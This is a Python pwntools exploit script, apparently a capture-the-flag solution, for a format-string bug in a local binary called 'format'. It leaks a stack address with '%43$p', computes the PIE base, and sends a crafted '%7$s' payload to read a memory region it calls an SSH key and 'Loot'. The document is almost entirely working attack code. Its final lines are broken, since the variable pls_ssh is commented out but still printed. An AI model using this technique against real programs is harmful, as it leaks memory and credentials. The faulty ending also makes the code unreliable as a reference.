from pwn import *
import re

elf = context.binary = ELF('./format', checksec=False)
p = process()

p.sendlineafter(b'> ', '3'.encode())
p.sendlineafter(b': ', '%43$p'.encode()) # Got 43 from fuzz.py
result = p.recvuntil(b'\n\n')
t = result.decode("ascii").strip()

match = re.search('0x([0-9a-f]{12})', t)
address = int(match.group(1), 16)
# print(hex(address)) # runtime _start offset

_start_offset = 0x001011a0
flag = 0x00104040

base_address = address - _start_offset
print("Base offset: ", hex(base_address)) # _base offset

flag_address = base_address + flag
print("Flag offset: ", hex(flag_address))

byte_array = bytearray(b'%7$s    ')

# Convert our address to bytes in reverse order
address_bytes = flag_address.to_bytes(8, 'little')
# print(binascii.hexlify(address_bytes))

# Add address and end line to our payload
byte_array += bytearray(address_bytes)
byte_array += bytearray(b'\n')
# print(binascii.hexlify(byte_array))

p.sendlineafter(b'> ', '3'.encode())
p.recvuntil(b': ')
p.send_raw(byte_array)


ssh_key = p.recvuntil(b'\n ')
# pls_ssh = ssh_key.decode().strip().split(" ") ## COME BACK AND FIX THIS
print(pls_ssh)
print("\n\nLoot\n")
print(pls_ssh[-1])

